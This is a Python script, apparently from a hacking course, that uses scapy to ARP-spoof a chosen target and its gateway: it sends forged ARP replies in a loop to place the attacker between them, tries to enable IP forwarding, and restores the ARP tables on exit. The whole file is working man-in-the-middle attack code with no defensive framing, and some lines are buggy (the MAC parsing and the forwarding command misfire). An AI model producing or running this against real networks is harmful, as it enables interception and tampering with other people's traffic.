#!/usr/bin/env python

import sys
import time
import scapy.all as scapy
import optparse
import re
import subprocess

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="chose the ip which u want to spoof")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="chose gateway ip to spoof")
    # return parser.parse_args()
    (options, arg) = parser.parse_args()
    if not options.target_ip:
        parser.error("please specify target ip")
    if not options.gateway_ip:
        parser.error("please specify gateway ip")
    return options

def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    #answerd_list , unanswerd_lits = scapy.srp(arp_request_broadcast, timeout= 1)
    answerd_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False )[0]


    mac = re.findall(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(answerd_list[0][1].summary))
    mac_answer = answerd_list[0][1].hwsrc
    return mac[1]

def spoof(target_ip, gateway_ip):
    # scapy.ls(scapy.ARP)
    # op is the type of packet 1 means request 2 means a response
    targetMAC= get_mac(target_ip)
    gatewayMAC= get_mac(gateway_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=targetMAC, psrc=gateway_ip)
    packet2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gatewayMAC, psrc=target_ip)
    # print(packet.summary())
    # print(packet.show())
    scapy.send(packet, verbose=False)
    scapy.send(packet2, verbose=False)
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=False)

def restore ():
    packet3 = scapy.ARP(op=2, pdst=desired_ip.target_ip, hwdst=get_mac(desired_ip.target_ip), psrc=desired_ip.gateway_ip,hwsrc=get_mac(desired_ip.gateway_ip))
    packet4 = scapy.ARP(op=2, pdst=desired_ip.gateway_ip, hwdst=get_mac(desired_ip.gateway_ip), psrc=desired_ip.target_ip, hwsrc=get_mac(desired_ip.target_ip))
    scapy.send(packet3, count=4,verbose=False)
    scapy.send(packet4,count=4, verbose=False)

desired_ip=get_arguments()
num_packets= 0
try:
    while True:
        spoof(desired_ip.target_ip , desired_ip.gateway_ip )
        num_packets= num_packets + 2
        print("\r[+] sending packets ",end=str(num_packets))
    # sys.stdout.flush()
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+] Ctrl + C detected ...... Quitting")
    restore()

